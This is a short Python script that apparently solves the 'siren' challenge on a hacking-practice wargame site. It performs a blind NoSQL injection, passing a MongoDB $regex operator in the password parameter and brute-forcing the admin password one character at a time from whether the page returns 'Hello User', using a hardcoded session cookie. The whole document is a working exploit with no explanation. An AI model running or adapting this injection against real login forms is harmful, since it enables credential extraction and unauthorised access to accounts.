import string
import requests

url = "https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php?id=admin&pw[$regex]="
cookies = {"PHPSESSID" : "qp6b7g99hjr3amos0h8f72npl5"}

flag = ''
j='a'

domain = string.digits + string.ascii_lowercase 
for i in range(30):
    for j in domain:
        payload = '^' + flag + j
        response = requests.get(url + payload,cookies=cookies)
        if("Hello User" in response.text):
            flag += j
            print("find the flag",flag)
            break
    if(j == domain[-1]):
        print("flag is ",flag)
        break
